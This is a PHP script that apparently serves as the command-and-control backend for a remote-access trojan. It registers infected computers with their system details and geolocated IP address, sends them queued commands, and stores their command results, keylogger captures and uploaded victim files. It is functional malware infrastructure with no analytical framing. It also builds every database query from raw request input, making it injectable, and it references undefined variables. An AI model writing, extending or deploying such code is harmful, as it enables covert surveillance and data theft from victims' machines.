<?php
include "connected.php";

if ($connected) {
	include "settings.php";
	
	$id = $_GET['id'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$compName = $_GET['compname'];
	$action = $_REQUEST['receive'];
	$interval = $_GET['interval'];
	$kl = $_POST['kl'];
	$os = $_GET['os'];
	$ramMemory = $_GET['memory'];
	$processor = $_GET['processor'];
	$date = date("Y-m-d H:i:s");
	$filename = $_GET['filename'];
	$uploadtype = $_GET['uploadtype'];
	
	$query = mysql_query("SELECT * FROM vircom WHERE id = '$id'");
	$row = mysql_fetch_array($query);
	if (mysql_num_rows($query)>0) {
		if (isset($action)) {
			
			if (isset($kl)) mysql_query("INSERT INTO klcom (id, kldata, dateTime) VALUES ('$id', '$action', '$time')");
			
			else if (isset($filename)) {
				$fullfilename = "uploads/" . $id . "_" . $filename;
				if (file_exists($fullfilename)) unlink ($fullfilename);
				move_uploaded_file($_FILES['file']['tmp_name'], $fullfilename);
				
				$retCommandNum = $row['retCommandNum'] + 1;
				mysql_query("UPDATE vircom SET command='', retCommand = '$uploadtype{-s}$fullfilename', retCommandNum = '$retCommandNum' WHERE id='$id'");
			}
			
			else {
				$retCommandNum = $row['retCommandNum'] + 1;
				mysql_query("UPDATE vircom SET command='', retCommand = '$action', retCommandNum = '$retCommandNum' WHERE id='$id'");
			}
		}
		
		else {
			echo $row['command'];
			mysql_query("UPDATE vircom SET lastUpdate='$date', updateInterval='$interval', command='' WHERE id='$id'");
		}	
	}
	else {
		$fp = file_get_contents("http://api.hostip.info/?ip=" . $ip);
		$start = strpos($fp, "<countryName>") + 13;
		$length = strpos($fp, "</countryName>") - $start;
		$location = substr($fp,  $start, $length) . ", ";
		$start = strpos($fp, "<gml:name>", 460) + 10;
		$length = strpos($fp, "</gml:name>", 460) - $start;
		$location .= substr($fp,  $start, $length);		
				
		mysql_query("INSERT INTO vircom (id, compName, ipAddress, location, lastUpdate, operatingSystem, updateInterval, ramMemory, processor, webcam) VALUES ('$id', '$compName', '$ip', '$location', '$date', '$os', '$interval', '$ramMemory', '$processor', '$webcam')");
	}
}
?>